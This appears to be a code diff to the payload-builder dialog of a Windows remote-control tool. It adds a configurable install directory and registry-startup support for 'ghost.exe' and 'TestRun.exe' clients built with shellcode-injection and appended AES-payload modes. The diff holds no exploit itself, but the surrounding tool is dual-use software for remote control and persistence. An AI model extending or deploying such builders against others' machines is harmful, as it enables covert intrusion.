@@ -10,6 +10,9 @@
 #include <bcrypt.h>
 #include <wincrypt.h>
 #include "Resource.h"
+extern "C" {
+#include "client/reg_startup.h"
+}
 // #include <ntstatus.h>
 
 enum Index {
@@ -198,6 +201,7 @@ typedef struct SCInfo {
     int len;
     int offset;
     char file[_MAX_PATH];
+    char targetDir[_MAX_PATH];
 } SCInfo;
 
 #define GetAddr(mod, name) GetProcAddress(GetModuleHandleA(mod), name)
@@ -292,11 +296,13 @@ void CBuildDlg::OnBnClickedOk()
     }
     int startup = Startup_DLL;
     CString file;
+    CString targetDir;
     switch (index) {
     case IndexTestRun_DLL:
     case IndexTestRun_MemDLL:
     case IndexTestRun_InjSC:
         file = "TestRun.exe";
+        targetDir = GetInstallDirectory(m_sInstallDir.IsEmpty() ? "Client Demo" : m_sInstallDir);
         typ = index == IndexTestRun_DLL ? CLIENT_TYPE_DLL : CLIENT_TYPE_MEMDLL;
         startup = std::map<int, int> {
             {IndexTestRun_DLL, Startup_DLL},{IndexTestRun_MemDLL, Startup_MEMDLL},{IndexTestRun_InjSC, Startup_InjSC},
@@ -305,17 +311,20 @@ void CBuildDlg::OnBnClickedOk()
         break;
     case IndexGhost:
         file = "ghost.exe";
+        targetDir = GetInstallDirectory(m_sInstallDir.IsEmpty() ? "Windows Ghost" : m_sInstallDir);
         typ = CLIENT_TYPE_ONE;
         szBuffer = ReadResource(is64bit ? IDR_GHOST_X64 : IDR_GHOST_X86, dwFileSize);
         break;
     case IndexGhostMsc:
         file = "ghost.exe";
+        targetDir = GetInstallDirectory(m_sInstallDir.IsEmpty() ? "Windows Ghost" : m_sInstallDir);
         typ = CLIENT_TYPE_ONE;
         startup = Startup_GhostMsc;
         szBuffer = ReadResource(is64bit ? IDR_GHOST_X64 : IDR_GHOST_X86, dwFileSize);
         break;
     case IndexTestRunMsc:
         file = "TestRun.exe";
+        targetDir = GetInstallDirectory(m_sInstallDir.IsEmpty() ? "Client Demo" : m_sInstallDir);
         typ = CLIENT_TYPE_MEMDLL;
         startup = Startup_TestRunMsc;
         szBuffer = ReadResource(is64bit ? IDR_TESTRUN_X64 : IDR_TESTRUN_X86, dwFileSize);
@@ -468,6 +477,7 @@ void CBuildDlg::OnBnClickedOk()
                                 payload = GetFilePath(NULL, m[n].c_str(), n != Payload_Raw);
                                 sc->offset = n == Payload_Raw ? 0 : GetFileSize(payload);
                                 strcpy(sc->file, PathFindFileNameA(payload));
+                                strcpy(sc->targetDir, targetDir);
                                 tip = payload.IsEmpty() ? "\r\n警告: 没有生成载荷!" : "\r\n提示: 载荷文件必须拷贝至程序目录。";
                             }
                             BOOL r = WriteBinaryToFile(strSeverFile.GetString(), (char*)data, dwSize);
@@ -726,7 +736,8 @@ void CBuildDlg::OnCbnSelchangeComboCompress()
 	static bool warned = false;
     if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES && !warned) {
 		warned = true;
-        MessageBoxA(_T("使用 ShellCode AES 在程序尾部追加载荷，可能无法在某些系统运行! 需切换为 ShellCode AES Old 模式生成!"), 
+        MessageBoxA(_T("使用 ShellCode AES 在程序尾部追加载荷，可能无法在某些服务器系统运行! "
+            "请自行验证。或者选择其他载荷，或者切换为 ShellCode AES Old 模式生成!"), 
             "提示", MB_ICONWARNING);
 	}
 }
